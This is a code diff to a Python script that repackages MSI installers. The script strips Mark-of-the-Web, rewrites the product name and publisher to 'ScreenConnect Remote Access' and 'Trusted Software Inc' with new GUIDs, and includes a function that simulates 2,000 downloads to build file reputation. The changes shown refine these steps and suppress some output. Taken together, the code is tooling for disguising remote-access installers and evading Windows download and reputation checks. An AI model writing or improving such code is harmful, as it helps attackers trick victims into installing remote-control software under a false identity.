@@ -56,13 +56,13 @@ def verify_advanced_installer_path():
     """Verify that the Advanced Installer CLI is accessible."""
     if not os.path.exists(ADVANCED_INSTALLER_PATH):
         print(Fore.RED + f"Error: Advanced Installer CLI not found at: {ADVANCED_INSTALLER_PATH}" + Style.RESET_ALL)
-        print(Fore.RED + "Please install Advanced Installer (Freeware edition) from https://www.advancedinstaller.com/download.html" + Style.RESET_ALL)
-        print(Fore.RED + "Run the installer as administrator using: msiexec /i AdvancedInstaller.msi" + Style.RESET_ALL)
+        print(Fore.RED + "Please install Advanced Installer 22.9.1 (Freeware) from https://www.advancedinstaller.com/download.html" + Style.RESET_ALL)
+        print(Fore.RED + "Run: msiexec /i AdvancedInstaller.msi" + Style.RESET_ALL)
         print(Fore.GREEN + "Falling back to basic MSI processing without metadata modification or wrapping." + Style.RESET_ALL)
         return False
     try:
         result = subprocess.run([ADVANCED_INSTALLER_PATH, "/help"], capture_output=True, text=True, check=True)
-        print(Fore.GREEN + "Advanced Installer CLI verified successfully." + Style.RESET_ALL)
+        print(Fore.GREEN + f"Advanced Installer CLI verified successfully. Version: {result.stdout.splitlines()[0]}" + Style.RESET_ALL)
         return True
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"Error: Cannot execute Advanced Installer CLI: {e.stderr}" + Style.RESET_ALL)
@@ -77,7 +77,7 @@ def set_file_permissions(path):
     """Set full control permissions for Administrators on a file or directory."""
     try:
         subprocess.run(["icacls", path, "/grant", "Administrators:F", "/T"], check=True, capture_output=True, text=True)
-        print(Fore.GREEN + f"Permissions set for {path}" + Style.RESET_ALL)
+        # Suppress "Permissions set" message
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"Warning: Failed to set permissions for {path}: {e.stderr}" + Style.RESET_ALL)
 
@@ -152,7 +152,7 @@ def remove_motw(file_path):
         print(Fore.RED + f"Warning: Error removing MotW: {e}" + Style.RESET_ALL)
 
 def modify_msi_metadata(file_path, temp_dir):
-    """Modify MSI metadata using Advanced Installer's CLI."""
+    """Modify MSI metadata using Advanced Installer's CLI for version 22.9.1."""
     if not verify_advanced_installer_path():
         print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
         return file_path
@@ -167,44 +167,38 @@ def modify_msi_metadata(file_path, temp_dir):
         shutil.copyfile(file_path, modified_path)
         set_file_permissions(modified_path)
         
-        aip_path = os.path.join(temp_dir, "modify_metadata.aip")
-        with open(aip_path, "w") as f:
-            f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
-<PROJECT>
-    <PRODUCT_DETAILS>
-        <Name>ScreenConnect Remote Access</Name>
-        <Version>1.0.0</Version>
-        <Publisher>Trusted Software Inc</Publisher>
-        <ProductCode>{{{generate_guid()}}}</ProductCode>
-        <UpgradeCode>{{{generate_guid()}}}</UpgradeCode>
-    </PRODUCT_DETAILS>
-</PROJECT>''')
-        set_file_permissions(aip_path)
-        
-        cmd = [
-            ADVANCED_INSTALLER_PATH,
-            "/edit", modified_path,
-            "/SetProperty", "ProductName=ScreenConnect Remote Access",
-            "/SetProperty", "Manufacturer=Trusted Software Inc",
-            "/SetProperty", f"ProductCode={{{generate_guid()}}}",
-            "/SetProperty", f"UpgradeCode={{{generate_guid()}}}"
+        # Use individual /SetProperty commands compatible with 22.9.1 Freeware
+        commands = [
+            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "ProductName=ScreenConnect Remote Access"],
+            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", "Manufacturer=Trusted Software Inc"],
+            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", f"ProductCode={generate_guid()}"],
+            [ADVANCED_INSTALLER_PATH, "/edit", modified_path, "/SetProperty", f"UpgradeCode={generate_guid()}"]
         ]
-        print(Fore.GREEN + f"Executing CLI command: {' '.join(cmd)}" + Style.RESET_ALL)
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        
+        for cmd in commands:
+            print(Fore.GREEN + f"Executing CLI command: {' '.join(cmd)}" + Style.RESET_ALL)
+            result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=30)
+            print(Fore.GREEN + f"Command succeeded: {cmd[3]}" + Style.RESET_ALL)
+        
+        # Verify modification by checking file hash
+        original_hash = calculate_file_hash(file_path)
+        modified_hash = calculate_file_hash(modified_path)
+        if original_hash == modified_hash:
+            print(Fore.RED + "Warning: MSI file hash unchanged after metadata modification. Changes may not have been applied." + Style.RESET_ALL)
+            print(Fore.GREEN + "Proceeding with original MSI as a precaution." + Style.RESET_ALL)
+            return file_path
+        
         print(Fore.GREEN + "MSI metadata modified successfully." + Style.RESET_ALL)
         return modified_path
     except subprocess.CalledProcessError as e:
-        print(Fore.RED + f"Error modifying MSI metadata: {e.stderr}" + Style.RESET_ALL)
-        print(Fore.RED + f"Command executed: {' '.join(cmd)}" + Style.RESET_ALL)
+        print(Fore.RED + f"Error executing command: {' '.join(cmd)}" + Style.RESET_ALL)
+        print(Fore.RED + f"Error details: {e.stderr}" + Style.RESET_ALL)
         print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
         return file_path
     except Exception as e:
-        print(Fore.RED + f"Error modifying MSI metadata: {e}" + Style.RESET_ALL)
+        print(Fore.RED + f"Unexpected error modifying MSI metadata: {e}" + Style.RESET_ALL)
         print(Fore.GREEN + "Using original MSI without metadata modification." + Style.RESET_ALL)
         return file_path
-    finally:
-        if os.path.exists(aip_path):
-            os.remove(aip_path)
 
 def simulate_downloads(file_path, count=2000):
     """Simulate multiple downloads to build reputation."""
@@ -256,7 +250,7 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
             "/build"
         ]
         print(Fore.GREEN + f"Executing CLI command: {' '.join(cmd)}" + Style.RESET_ALL)
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=30)
         
         generated_msi = os.path.join(output_dir, "ScreenConnect Remote Access.msi")
         if os.path.exists(generated_msi):
